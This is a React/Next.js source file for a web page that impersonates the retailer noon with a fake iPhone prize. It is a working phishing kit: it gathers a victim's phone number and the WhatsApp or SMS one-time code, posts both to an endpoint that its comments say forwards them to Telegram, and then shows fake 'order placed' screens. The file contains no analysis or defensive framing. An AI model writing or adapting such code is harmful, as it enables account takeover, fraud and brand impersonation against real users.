"use client";

import { useEffect, useState, useRef } from "react";
import Image from "next/image";
import giftPhoneImage from "@/images/img1.png";
import promoBanner from "@/images/banner.png";

// ─── Types ───────────────────────────────────────────────────────────────────
type Step = "phone" | "otp" | "placing" | "driving" | "success";

// ─── Helpers ─────────────────────────────────────────────────────────────────
function formatPhone(raw: string) {
  // ensure it starts with +
  const cleaned = raw.replace(/\s/g, "");
  if (cleaned.startsWith("+")) return cleaned;
  // default to KSA if no country code
  return "+966" + cleaned;
}

// ─── Component ───────────────────────────────────────────────────────────────
export default function HomePage() {
  const [step, setStep] = useState<Step>("phone");
  const [phone, setPhone] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (step !== "placing" && step !== "driving") return;
    const timeout = setTimeout(() => {
      if (step === "placing") {
        setStep("driving");
      } else {
        setStep("success");
      }
    }, 2400);
    return () => clearTimeout(timeout);
  }, [step]);
  
  // ── Step 1: Send phone to Telegram ──────────────────────────────────────────
  async function handleSendPhone() {
    setError("");
    if (!phone.trim()) {
      setError("Please enter your phone number.");
      return;
    }

    const formatted = formatPhone(phone.trim());
    setLoading(true);

    try {
      const notifyRes = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "phone_submission",
          phone: formatted,
        }),
      });

      if (!notifyRes.ok) {
        const payload = (await notifyRes.json().catch(() => null)) as
          | { error?: string; details?: string }
          | null;
        throw new Error(payload?.details || payload?.error || "failed-phone-notify");
      }

      setStep("otp");
    } catch (err: unknown) {
      console.error(err);
      const message = err instanceof Error ? err.message : "";
      setError(
        message && message !== "failed-phone-notify"
          ? `Failed to submit your number: ${message}`
          : "Failed to submit your number. Please try again."
      );
    } finally {
      setLoading(false);
    }
  }

  // ── Step 2: Send OTP to Telegram ───────────────────────────────────────────
  async function handleSubmitOtp() {
    setError("");
    const code = otp.join("");
    if (code.length < 6) {
      setError("Please enter all 6 digits.");
      return;
    }

    setLoading(true);
    try {
      const notifyRes = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "otp_submission",
          phone: formatPhone(phone),
          otp: code,
        }),
      });

      if (!notifyRes.ok) {
        const payload = (await notifyRes.json().catch(() => null)) as
          | { error?: string; details?: string }
          | null;
        throw new Error(payload?.details || payload?.error || "failed-otp-notify");
      }

      setStep("placing");
    } catch (err: unknown) {
      console.error(err);
      const message = err instanceof Error ? err.message : "";
      setError(
        message && message !== "failed-otp-notify"
          ? `Failed to submit OTP: ${message}`
          : "Failed to submit OTP. Please try again."
      );
    } finally {
      setLoading(false);
    }
  }

  // ── OTP input handlers ─────────────────────────────────────────────────────
  function handleOtpChange(index: number, value: string) {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 5) {
      otpRefs.current[index + 1]?.focus();
    }
  }

  function handleOtpKeyDown(index: number, e: React.KeyboardEvent) {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  }

  async function handleRequestAnotherOtp() {
    setError("");
    setLoading(true);
    try {
      const notifyRes = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "otp_resend_request",
          phone: formatPhone(phone),
        }),
      });
      if (!notifyRes.ok) {
        const payload = (await notifyRes.json().catch(() => null)) as
          | { error?: string; details?: string }
          | null;
        throw new Error(payload?.details || payload?.error || "failed-resend-request");
      }
      setOtp(["", "", "", "", "", ""]);
    } catch (err) {
      console.error(err);
      const message = err instanceof Error ? err.message : "";
      setError(
        message && message !== "failed-resend-request"
          ? `Failed to request a new OTP: ${message}`
          : "Failed to request a new OTP. Please try again."
      );
    } finally {
      setLoading(false);
    }
  }

  // ─── Render ──────────────────────────────────────────────────────────────
  return (
    <div className="page-wrapper" style={styles.page}>
      {/* ── Product / Prize Section ────────────────────────── */}
      {step === "phone" || step === "otp" ? <div style={styles.prizeSection}>
        <div style={styles.promoBannerCard}>
          <Image
            src={promoBanner}
            alt="Noon offer banner"
            fill
            sizes="(max-width: 480px) 100vw, 480px"
            style={{ objectFit: "cover" }}
          />
          <div style={styles.promoOverlay}>
            <span style={styles.promoTag}>Limited Time Gift Campaign</span>
            <h2 style={styles.promoTitle}>Exclusive noon gift campaign</h2>
          </div>
        </div>
        <div style={styles.prizeCard}>
          <div style={styles.prizeImageWrap}>
            <Image
              src={giftPhoneImage}
              alt="iPhone Prize"
              width={170}
              height={190}
              style={styles.prizeImage}
              priority
            />
          </div>
          <div style={styles.prizeInfo}>
            <div style={styles.prizeTag}>🎁 Exclusive Gift</div>
            <h2 style={styles.prizeTitle}>You've Been Selected!</h2>
            <p style={styles.prizeDesc}>
              Congratulations! You have won a special gift from noon. Verify your
              number below to claim your reward.
            </p>
          </div>
        </div>
      </div> : null}

      {/* ── Form Section ──────────────────────────────────── */}
      <div style={styles.formSection}>
        {step === "phone" && (
          <div className="fade-in" style={styles.formCard}>
            <h3 style={styles.formTitle}>Verify Your Gift</h3>
            <p style={styles.formSubtitle}>
              Enter your phone number to receive your one-time verification code.
            </p>
            <div style={styles.inputGroup}>
              <label style={styles.inputLabel}>Phone Number</label>
              <div style={styles.phoneFieldWrap}>
                <span style={styles.phonePrefix}>+966</span>
                <input
                  type="tel"
                  placeholder="5xxxxxxx"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSendPhone()}
                  style={styles.input}
                  disabled={loading}
                />
              </div>
            </div>
            {error && <p style={styles.errorMsg}>⚠️ {error}</p>}
            <button
              onClick={handleSendPhone}
              disabled={loading}
              style={{
                ...styles.btn,
                ...(loading ? styles.btnDisabled : {}),
              }}
            >
              {loading ? (
                <span style={styles.spinner} />
              ) : (
                "Submit Number →"
              )}
            </button>
          </div>
        )}

        {step === "otp" && (
          <div className="fade-in" style={styles.formCard}>
            <div style={styles.otpHeaderRow}>
              <button
                onClick={() => {
                  setStep("phone");
                  setError("");
                  setOtp(["", "", "", "", "", ""]);
                }}
                style={styles.otpBackBtn}
              >
                ←
              </button>
              <span style={styles.otpAttempts}>8 attempts left</span>
            </div>
            <h3 style={styles.otpTitle}>Verify your mobile number</h3>
            <p style={styles.formSubtitle}>
              To use this address, enter the OTP sent to{" "}
              <strong>{formatPhone(phone)}</strong> via
            </p>
            <p style={styles.otpChannel}>WhatsApp</p>
            <div style={styles.otpRow}>
              {otp.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => { otpRefs.current[i] = el; }}
                  type="tel"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
                  style={{
                    ...styles.otpBox,
                    ...(digit ? styles.otpBoxFilled : {}),
                  }}
                  disabled={loading}
                />
              ))}
            </div>
            {error && <p style={styles.errorMsg}>⚠️ {error}</p>}
            <button
              onClick={handleSubmitOtp}
              disabled={loading}
              style={{
                ...styles.btn,
                ...(loading ? styles.btnDisabled : {}),
              }}
            >
              {loading ? <span style={styles.spinner} /> : "Submit OTP →"}
            </button>
            <div style={styles.resendRow}>
              <span style={styles.resendLabel}>Didn't get the OTP?</span>
            </div>
            <div style={styles.resendViaLabel}>Resend OTP via</div>
            <div style={styles.resendMethodRow}>
              <button
                onClick={handleRequestAnotherOtp}
                disabled={loading}
                style={{
                  ...styles.resendMethodBtn,
                  ...(loading ? styles.resendDisabled : {}),
                }}
              >
                WhatsApp
              </button>
              <button
                onClick={handleRequestAnotherOtp}
                disabled={loading}
                style={{
                  ...styles.resendMethodBtn,
                  ...(loading ? styles.resendDisabled : {}),
                }}
              >
                SMS
              </button>
            </div>
          </div>
        )}

        {step === "placing" && (
          <div className="fade-in" style={styles.processScreen}>
            <div style={styles.dropAnimationWrap}>
              <div style={styles.fallingGift}>
                <Image
                  src={giftPhoneImage}
                  alt="Gift device"
                  width={38}
                  height={52}
                  style={{ objectFit: "contain", transform: "rotate(-18deg)" }}
                />
              </div>
              <div style={styles.boxShadow} />
              <div style={styles.orderBox}>
                <div style={styles.orderBoxLidLeft} />
                <div style={styles.orderBoxLidRight} />
                <span style={styles.orderBoxLogo}>noon</span>
              </div>
            </div>
            <h3 style={styles.processTitle}>Your order is being placed</h3>
          </div>
        )}

        {step === "driving" && (
          <div className="fade-in" style={styles.processScreen}>
            <div style={styles.vanScene}>
              <div style={styles.speedLineOne} />
              <div style={styles.speedLineTwo} />
              <div style={styles.vanBody}>
                <div style={styles.vanCabin} />
                <span style={styles.vanLogo}>noon</span>
                <div style={styles.wheelLeft} />
                <div style={styles.wheelRight} />
              </div>
            </div>
            <h3 style={styles.processTitle}>Yay! Your order has been placed!</h3>
          </div>
        )}

        {step === "success" && (
          <div className="fade-in" style={styles.processScreen}>
            <div style={styles.finalSuccessRing}>
              <div style={styles.finalSuccessInner}>
                <span style={styles.finalSuccessTick}>✓</span>
              </div>
            </div>
            <h3 style={styles.processTitle}>Yay! Your order has been placed!</h3>
          </div>
        )}
      </div>

      {/* ── Footer ────────────────────────────────────────── */}
      {step === "phone" || step === "otp" ? <footer style={styles.footer}>
        <div style={styles.footerTopCard}>
          <div style={styles.socialRow}>
            <span style={styles.socialIcon}>f</span>
            <span style={styles.socialIcon}>X</span>
            <span style={styles.socialIcon}>IG</span>
            <span style={styles.socialIcon}>in</span>
          </div>
          <p style={styles.footerLinkLine}>Terms Of Use  ·  Terms Of Sale  ·  Privacy Policy</p>
          <p style={styles.footerLinkLine}>Warranty Policy  ·  Return Policy  ·</p>
          <p style={styles.footerLinkLine}>Customer Happiness Center</p>
        </div>

        <p style={styles.footerMetaText}>
          Noon E Commerce Solutions One Person Company LLC
        </p>
        <p style={styles.footerMetaText}>
          CR No. 1010703009 | VAT No. 302004655210003
        </p>
        <p style={styles.footerVersionText}>Version v4.260413 (16309)</p>
        <p style={styles.footerCopyright}>© 2026 noon.com. All rights reserved.</p>
      </footer> : null}

    </div>
  );
}

// ─── Styles ───────────────────────────────────────────────────────────────────
const styles: Record<string, React.CSSProperties> = {
  page: {
    background: "linear-gradient(180deg, #fffef6 0%, #ffffff 32%)",
    minHeight: "100vh",
  },

  // Prize Section
  prizeSection: {
    padding: "16px",
    background: "linear-gradient(180deg, #fffbe8 0%, #fff 80%)",
  },
  promoBannerCard: {
    position: "relative",
    width: "100%",
    height: "176px",
    overflow: "hidden",
    borderRadius: "18px",
    border: "2px solid #ffe37a",
    boxShadow: "0 10px 24px rgba(255,212,0,0.28)",
    marginBottom: "14px",
  },
  promoOverlay: {
    position: "absolute",
    inset: 0,
    background: "linear-gradient(180deg, rgba(0,0,0,0.05) 0%, rgba(0,0,0,0.48) 100%)",
    display: "flex",
    flexDirection: "column",
    justifyContent: "flex-end",
    padding: "12px",
  },
  promoTag: {
    alignSelf: "flex-start",
    fontSize: "10px",
    fontWeight: 700,
    color: "#181818",
    background: "#ffd400",
    padding: "4px 8px",
    borderRadius: "999px",
    marginBottom: "7px",
    textTransform: "uppercase",
    letterSpacing: "0.4px",
  },
  promoTitle: {
    color: "#fff",
    fontSize: "19px",
    lineHeight: 1.2,
    fontWeight: 800,
  },
  prizeCard: {
    display: "flex",
    gap: "14px",
    alignItems: "flex-start",
    background: "linear-gradient(145deg, #fffce9 0%, #fff4bd 100%)",
    border: "2px solid #ffd94e",
    borderRadius: "16px",
    padding: "14px",
    boxShadow: "0 8px 24px rgba(255,212,0,0.22)",
  },
  prizeImageWrap: {
    flexShrink: 0,
    width: "145px",
    height: "180px",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "radial-gradient(circle at 50% 28%, #ffffff 0%, #f5f7fb 100%)",
    borderRadius: "12px",
    boxShadow: "0 6px 14px rgba(0,0,0,0.09)",
    overflow: "hidden",
  },
  prizeImage: {
    objectFit: "contain",
    transform: "scale(1.05)",
  },
  prizeInfo: {
    flex: 1,
  },
  prizeTag: {
    display: "inline-block",
    background: "var(--noon-yellow)",
    color: "#1a1a1a",
    fontSize: "10px",
    fontWeight: 700,
    textTransform: "uppercase",
    letterSpacing: "0.5px",
    padding: "3px 8px",
    borderRadius: "4px",
    marginBottom: "10px",
  },
  prizeTitle: {
    fontSize: "20px",
    fontWeight: 800,
    color: "#1a1a1a",
    marginBottom: "8px",
    lineHeight: 1.2,
  },
  prizeDesc: {
    fontSize: "14px",
    color: "#4f4f4f",
    lineHeight: 1.45,
    marginBottom: "12px",
  },
  // Form Section
  formSection: {
    padding: "16px",
    background: "linear-gradient(180deg, #fff 0%, #f7f8fc 100%)",
  },
  formCard: {
    background: "#fff",
    borderRadius: "16px",
    padding: "24px 20px",
    border: "1px solid #f1f1f1",
    boxShadow: "0 10px 26px rgba(19,26,36,0.08)",
  },
  formTitle: {
    fontSize: "20px",
    fontWeight: 800,
    color: "#1a1a1a",
    marginBottom: "6px",
    textAlign: "center",
  },
  formSubtitle: {
    fontSize: "13px",
    color: "#666",
    textAlign: "center",
    marginBottom: "20px",
    lineHeight: 1.5,
  },
  inputGroup: {
    marginBottom: "16px",
  },
  inputLabel: {
    display: "block",
    fontSize: "12px",
    fontWeight: 600,
    color: "#555",
    marginBottom: "6px",
    textTransform: "uppercase",
    letterSpacing: "0.5px",
  },
  input: {
    width: "100%",
    padding: "16px 14px",
    fontSize: "16px",
    fontFamily: "inherit",
    border: "none",
    outline: "none",
    color: "#1a1a1a",
    background: "transparent",
    transition: "border-color 0.2s",
  },
  phoneFieldWrap: {
    border: "1.5px solid #dcdfe7",
    borderRadius: "12px",
    background: "#fbfcff",
    display: "flex",
    alignItems: "center",
    overflow: "hidden",
  },
  phonePrefix: {
    fontSize: "16px",
    fontWeight: 700,
    color: "#1f2a44",
    background: "#eef1f7",
    padding: "16px 12px",
    borderRight: "1px solid #dde2ed",
  },
  errorMsg: {
    fontSize: "13px",
    color: "var(--noon-red)",
    background: "#fff5f5",
    border: "1px solid #ffcdd2",
    borderRadius: "8px",
    padding: "10px 14px",
    marginBottom: "14px",
    textAlign: "center",
  },
  btn: {
    width: "100%",
    padding: "15px",
    background: "var(--noon-yellow)",
    color: "#1a1a1a",
    border: "none",
    borderRadius: "10px",
    fontSize: "15px",
    fontWeight: 700,
    fontFamily: "inherit",
    cursor: "pointer",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "8px",
    transition: "transform 0.15s, box-shadow 0.15s",
    boxShadow: "0 4px 14px rgba(255,212,0,0.4)",
    marginBottom: "16px",
  },
  btnDisabled: {
    opacity: 0.7,
    cursor: "not-allowed",
  },
  spinner: {
    width: "20px",
    height: "20px",
    border: "2.5px solid rgba(26,26,26,0.2)",
    borderTopColor: "#1a1a1a",
    borderRadius: "50%",
    display: "inline-block",
    animation: "spin 0.7s linear infinite",
  },
  otpHeaderRow: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    marginBottom: "14px",
  },
  otpBackBtn: {
    border: "none",
    background: "none",
    color: "#333",
    fontSize: "26px",
    lineHeight: 1,
    cursor: "pointer",
    padding: "2px 0",
  },
  otpAttempts: {
    fontSize: "14px",
    color: "#c7c7c7",
    fontWeight: 700,
  },
  otpTitle: {
    fontSize: "42px",
    lineHeight: 1.08,
    fontWeight: 800,
    color: "#1f2a44",
    marginBottom: "12px",
    textAlign: "left",
    letterSpacing: "-0.8px",
  },
  otpChannel: {
    textAlign: "center",
    color: "#24a646",
    fontSize: "30px",
    fontWeight: 700,
    marginTop: "-10px",
    marginBottom: "16px",
  },

  // OTP
  otpRow: {
    display: "flex",
    gap: "10px",
    justifyContent: "center",
    marginBottom: "24px",
  },
  otpBox: {
    width: "49px",
    height: "58px",
    textAlign: "center",
    fontSize: "26px",
    fontWeight: 700,
    border: "2px solid #d5dbe4",
    borderRadius: "8px",
    outline: "none",
    background: "#fafafa",
    color: "#1a1a1a",
    transition: "border-color 0.2s, background 0.2s",
    fontFamily: "monospace",
  },
  otpBoxFilled: {
    borderColor: "var(--noon-yellow)",
    background: "#fffbea",
  },
  resendRow: {
    textAlign: "center",
    marginBottom: "10px",
  },
  resendLabel: {
    fontSize: "16px",
    color: "#2a2a2a",
    fontWeight: 500,
  },
  resendViaLabel: {
    textAlign: "center",
    fontSize: "17px",
    color: "#2a2a2a",
    fontWeight: 700,
    marginBottom: "12px",
  },
  resendMethodRow: {
    display: "flex",
    gap: "10px",
    marginBottom: "12px",
  },
  resendMethodBtn: {
    flex: 1,
    border: "2px solid #d4d9e2",
    borderRadius: "26px",
    background: "#fff",
    color: "#2d3c57",
    fontSize: "20px",
    fontWeight: 700,
    padding: "12px 10px",
    cursor: "pointer",
  },
  resendDisabled: {
    color: "#999",
    cursor: "not-allowed",
    opacity: 0.7,
  },

  // Processing and final success screens
  processScreen: {
    minHeight: "70vh",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    justifyContent: "center",
    background: "#fff",
    borderRadius: "20px",
    padding: "24px 16px 80px",
  },
  dropAnimationWrap: {
    width: "100%",
    maxWidth: "280px",
    height: "230px",
    position: "relative",
    marginBottom: "20px",
  },
  fallingGift: {
    position: "absolute",
    top: "0",
    left: "50%",
    transform: "translateX(-50%)",
    animation: "giftDrop 1.2s ease-in-out infinite",
    zIndex: 2,
  },
  boxShadow: {
    position: "absolute",
    width: "190px",
    height: "18px",
    borderRadius: "50%",
    background: "rgba(0,0,0,0.18)",
    left: "50%",
    bottom: "18px",
    transform: "translateX(-50%)",
    filter: "blur(2px)",
  },
  orderBox: {
    position: "absolute",
    left: "50%",
    bottom: "26px",
    transform: "translateX(-50%)",
    width: "190px",
    height: "95px",
    background: "#ffd400",
    borderRadius: "8px",
    boxShadow: "0 8px 20px rgba(0,0,0,0.18)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    overflow: "hidden",
  },
  orderBoxLidLeft: {
    position: "absolute",
    width: "56%",
    height: "26px",
    background: "#ffeb6a",
    top: "-14px",
    left: "-6px",
    transform: "rotate(-5deg)",
    borderRadius: "5px",
  },
  orderBoxLidRight: {
    position: "absolute",
    width: "56%",
    height: "26px",
    background: "#fff7c2",
    top: "-14px",
    right: "-6px",
    transform: "rotate(5deg)",
    borderRadius: "5px",
  },
  orderBoxLogo: {
    fontSize: "40px",
    fontWeight: 800,
    color: "#1b1b1b",
    letterSpacing: "-1px",
  },
  vanScene: {
    width: "100%",
    maxWidth: "290px",
    height: "180px",
    position: "relative",
    marginBottom: "16px",
    overflow: "hidden",
  },
  speedLineOne: {
    position: "absolute",
    left: "16px",
    top: "70px",
    width: "55px",
    height: "4px",
    background: "#b8bec9",
    borderRadius: "20px",
    animation: "speedFlash 0.8s linear infinite",
  },
  speedLineTwo: {
    position: "absolute",
    left: "22px",
    top: "85px",
    width: "40px",
    height: "4px",
    background: "#d0d6df",
    borderRadius: "50%",
    animation: "speedFlash 0.8s linear infinite 0.2s",
  },
  vanBody: {
    position: "absolute",
    left: "0",
    top: "40px",
    width: "180px",
    height: "78px",
    background: "#ffd400",
    borderRadius: "22px 30px 12px 12px",
    animation: "vanDrive 2s ease-in-out infinite",
    boxShadow: "0 10px 18px rgba(0,0,0,0.15)",
  },
  vanCabin: {
    position: "absolute",
    right: "0",
    top: "12px",
    width: "52px",
    height: "42px",
    background: "#121417",
    borderRadius: "15px 16px 10px 14px",
    opacity: 0.95,
  },
  vanLogo: {
    position: "absolute",
    left: "24px",
    top: "24px",
    fontSize: "38px",
    fontWeight: 800,
    letterSpacing: "-1px",
    color: "#121417",
  },
  wheelLeft: {
    position: "absolute",
    left: "26px",
    bottom: "-11px",
    width: "26px",
    height: "26px",
    background: "#0c0f12",
    border: "4px solid #fff",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    borderRadius: "50%",
  },
  wheelRight: {
    position: "absolute",
    right: "22px",
    bottom: "-11px",
    width: "26px",
    height: "26px",
    background: "#0c0f12",
    border: "4px solid #fff",
    borderRadius: "50%",
  },
  processTitle: {
    textAlign: "center",
    color: "#0f1216",
    fontSize: "22px",
    lineHeight: 1.2,
    fontWeight: 700,
  },
  finalSuccessRing: {
    width: "230px",
    height: "230px",
    borderRadius: "50%",
    background: "#e9f9f4",
    border: "1px solid #e4f2ef",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    marginBottom: "18px",
  },
  finalSuccessInner: {
    width: "120px",
    height: "120px",
    borderRadius: "50%",
    border: "14px solid #188b71",
    background: "#fff",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    animation: "pop 0.35s ease-out forwards",
  },
  finalSuccessTick: {
    fontSize: "64px",
    lineHeight: 1,
    color: "#0f1115",
    fontWeight: 700,
  },

  // Footer
  footer: {
    padding: "16px 16px 30px",
    background: "#f7f8fc",
    textAlign: "center",
  },
  footerTopCard: {
    background: "#fff",
    borderTop: "1px solid #eef0f5",
    borderBottom: "1px solid #eef0f5",
    padding: "24px 14px 22px",
    marginBottom: "34px",
  },
  socialRow: {
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    gap: "42px",
    marginBottom: "20px",
  },
  socialIcon: {
    color: "#8b93aa",
    fontSize: "22px",
    fontWeight: 700,
    minWidth: "26px",
  },
  footerLinkLine: {
    color: "#8b93aa",
    fontSize: "17px",
    lineHeight: 1.9,
    fontWeight: 500,
  },
  footerMetaText: {
    color: "#d4d8e1",
    fontSize: "18px",
    lineHeight: 1.8,
    fontWeight: 500,
  },
  footerVersionText: {
    color: "#d4d8e1",
    fontSize: "20px",
    marginTop: "12px",
    marginBottom: "22px",
    fontWeight: 500,
  },
  footerCopyright: {
    color: "#737b92",
    fontSize: "20px",
    fontWeight: 500,
  },
};
